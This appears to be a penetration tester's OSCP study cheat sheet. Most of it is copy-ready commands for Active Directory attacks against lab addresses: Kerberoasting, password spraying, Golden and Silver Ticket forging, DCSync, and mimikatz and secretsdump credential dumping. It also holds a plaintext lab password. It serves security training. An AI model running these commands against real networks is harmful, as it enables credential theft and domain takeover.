# OSCP


File Management:-

	Linux:-
		
		ls -la : show hidden files & size & permissions.
		lsattr : list files attribute and if you can append even if you don't have write permission.
		chattr : change files attribute (a:append,e:can't change,I:can't delete or move,etc..).	
		ln originFile copyFile : to make hard link of originFile to copyFile
		ln -s sourceFile copyFile : to make a soft link(shortcut in windows) to sourceFile, you will find -i when you ls -la copyFile.




	Windows:-
	
		dir /(A,S,Q): display files attributes,files in directories & sub directories,files owner.
		
Privilege Escalation:-

privilege escalation:-

	privilege escalation awsome scripts:-
		1-WinPEAS
		2-LinPEAS
	LinEnum
	WinEnum
	Windows-Exploit-Suggestor

SMB Enumeration:-

	enum4linux,nmap to get domain controller + user 
	smbmap -H 10.10.11.152 -u 'guest' -d Timelapse.htb     --- to search for readable/writable shares you can use -R for recursive 
	smbclient //10.10.11.152/Shares -U Timelapse.htb/guest  --- to connect where Timelapse.htb is the domain controller and guest is the user
	
	
Password Attacks

	fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt winrm_backup.zip	--- to crack zip files


General Information:-

	PFX files contains certificate and private key which can be extracted using openssl
	evil-winrm -k private.key -c public.key -i 10.10.11.152 -S   ---- to connect to winrm on port 5986 with ssl 
	example of evil-winrm to hack active directory:
			*Evil-WinRM* PS C:\users> $so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
			*Evil-WinRM* PS C:\users> $p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
			*Evil-WinRM* PS C:\users> $c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
			invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {net user svc_deploy}
			invoke-command -computername localhost -credential $c -port 5986 -usessl -SessionOption $so -scriptblock {Get-ADComputer -Filter * -properties ms-mcs-admpwd,ms-mcs-admpwdexpirationtime}
	

	
Active Directory Attacks:-


	Tools:-
		1-Bloodhound-sharphound
		2-Impacket
			*secretsdump.py
			*psexec.py (system)
			*GetUserSPNs.py
			*wmiexec.py (adminisrator)
		3-Powerview
		4-Rubeus
		5-crackmapexec
		6-kerbrute
		7-mimikatz
		
	Kerberoasting: Post exploitation attack, require a valid user (TGT) to request TGS from a service account with SPN and crack the TGS to get the credentials out of it (TGS is encrypted with the NTLM hash of the SPN account password).
		Tools that can be used:-
			1-Rubeus
			2-Impacket GetUserSPNs.py
			3-Powershell scripts, etc..
		Steps:-
			impacket-GetUserSPNs test.int/yazan:'yazan' -dc-ip 192.168.100.200   //serach for SPN that can help us in escilating priv.
			impacket-GetUserSPNs test.int/yazan:'yazan' -dc-ip 192.168.100.200 -request -outputfile output.hash // save the hash
			hashcat --force -m 13100 -a 0 output.hash rockyou.txt //dictionary attack to get the password 
		
		Prevention:-
			Use strong and complex password or host based password insted of user based password.
			
	Default Settings -Add-Computer
	
		Configration:-
			ms-DS-MachineAccountQuota attribute (10 by default)
			add workstation to the domain permission (enabled by default)
		Steps:-
			crackmapexec smb 192.168.200.1/30 //search for machines
			crackmapexec smb 192.168.200.1/30 -u yazan -p 'yazan' -d domain.ini //search for the domain controller 
			impacket-addcomputer -dc-ip 192.168.100.200 domain.iti/yazan:'yazan' -computer-name Computer1$ -computer-password yazan //create a computer account the name of it must containt $ at the end 
		Prevention:-
			from the configuration give it only for the needed staff.
	
	Password spraying:-
		Tools:-
			1-Metasploit- smb_login
			2-crackmapexec
		Steps:-
			impacket-GetADUsers domain.ini/yazan:'yazan' -dc-ip 192.168.100.200 > user.txt //get all users in domain
			crackmapexec smb 192.168.200.100 -u users.txt -p yazan // start the attack untill you find a user with the specified password
	Golden Ticket:-
		
		The Golden Ticket is the Kerberos authentication token for the KRBTGT account, a special hidden account with the job of encrypting all the authentication tokens for the DC. That Golden Ticket can then use a pass-the-hash technique to log into any account, allowing attackers to move around unnoticed inside the network
		
		Steps:-
			
			lsadump::dcsync /user:DOMAIN\Krbtgt
			kerberos::golden /domain:domain.com /sid:S-1-5-21-5840559-2756745051-1363507867 /aes256:ffa8bd983a5a03618bdf577c2d79a467265f140ba339b89cc0a9c1bfdb4747f5 /user:NonExistentUser /ticket:GoldenTicket.kirbi /ptt

			for more details https://www.netwrix.com/how_golden_ticket_attack_works.html
	
	Silver Ticket:-
	
		Silver Ticket only enables an attacker to forge ticket-granting service (TGS) tickets for specific services. TGS tickets are encrypted with the password hash for the service; therefore, if an adversary steals the hash for a service account, they can mint TGS tickets for that service.
		Steps:-
			PS> .\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" exit //or below
			privilege::debug //run in debug mode
			sekurlsa::logonpasswords //view passwords in memory
			kerberos::golden /user:NonExistentUser /domain:domain.com /sid:S-1-5-21-5840559-2756745051-1363507867 /rc4:8fbe632c51039f92c21bcef456b31f2b /target:FileServer1.domain.com /service:cifs /ptt
			misc::cmd
			check https://www.netwrix.com/silver_ticket_attack_forged_service_tickets.html for more details.
			
	AS-REP Roasting:-
	
		attack against Kerberos for user accounts that do not require preauthentication,During preauthentication, a user will enter their password which will be used to encrypt a timestamp and then the domain controller will attempt to decrypt it and validate that the right password was used and that it is not replaying a previous request.  From there, the TGT will be issued for the user to use for future authentication.  If preauthentication is disabled, an attacker could request authentication data for any user and the DC would return an encrypted TGT that can be brute-forced offline.  
		
		Steps:-
			(Method 1)
			.\Rubeus.exe asreproast  //search for users hash
			$krb5asrep$spot@offense.local:hash // user hash found
			$krb5asrep$23$spot@offense.local:hash //insert 23 after the $krb5asrep$
			hashcat -m18200 '$krb5asrep$23$spot@offense.local:hash -a 3 /usr/share/wordlists/rockyou.txt
			(Method 2)
			Kerbrute
			(Method 3 from kali, you need to have username)
			GetNPUsers.py domain.local/administrator
			
![image](https://user-images.githubusercontent.com/91881471/174433005-d10ed507-c66c-4760-9eff-4a1c9099ee7e.png)


	Requesting RC4 Encrypted Ticket:-
	
		As mentioned in the beginning, it's still possible to request an RC4 ecnrypted ticket (if RC4 is not disabled in the environment, which does not seem to be common yet):
		
		Steps:-
			F:\Rubeus\Rubeus.exe kerberoast /tgtdeleg
			then crack it
	Enumeration:-
		
		crackmapexec smb 10.10.10.10 --shares -u '' -p ''
		net user /domain user_name
	DCSync attack:-
	
		telling the domain contrller that you are a domain controller trying to replicate the hashes of the users.
		
		Steps:-
			(Method 1)
			Mimikatz
			(Method 2)
			impacket-secretsdump.py domain.local/administartor@10.10.10.10
			
	Pass-the-hash attack:-
	
		crackmapexec smb 10.10.10.10 -u administrator -H hash
		
	Gaining shell:-
	
		impacket-psexec.py domain.local/administrator@10.10.10.10 -H hash 
	
